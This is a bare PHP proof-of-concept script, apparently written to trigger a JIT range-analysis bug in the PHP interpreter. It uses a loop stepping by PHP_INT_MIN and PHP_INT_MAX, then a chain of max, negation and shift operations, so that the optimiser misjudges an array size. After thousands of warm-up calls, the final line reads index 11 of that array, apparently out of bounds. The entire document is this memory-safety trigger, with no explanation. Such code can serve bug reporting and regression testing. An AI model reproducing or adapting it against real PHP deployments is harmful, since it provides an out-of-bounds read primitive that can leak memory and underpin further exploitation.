<?php

function trigger() {
  $x = PHP_INT_MIN;
  $k = 0;
  for ($i = 0; $i < 1; $i += $x) {
      if ($i == PHP_INT_MIN) {
        $x = PHP_INT_MAX;
      }

      if (++$k > 10) {
        break;
      }
  }

  $value = max($i, 1024);
  $value = -$value;
  $value = max($value, -1025);
  $value = -$value;
  $value -= 1022;
  $value >>= 1; // *** 3 ***
  $value += 10; //

  $array = array_fill(0, $value, null);
  $array[0] = 1.1;
  return array($array, array());
}

for ($i = 0; $i < 20000; ++$i) {
  trigger();
}

print trigger()[0][11];

?>
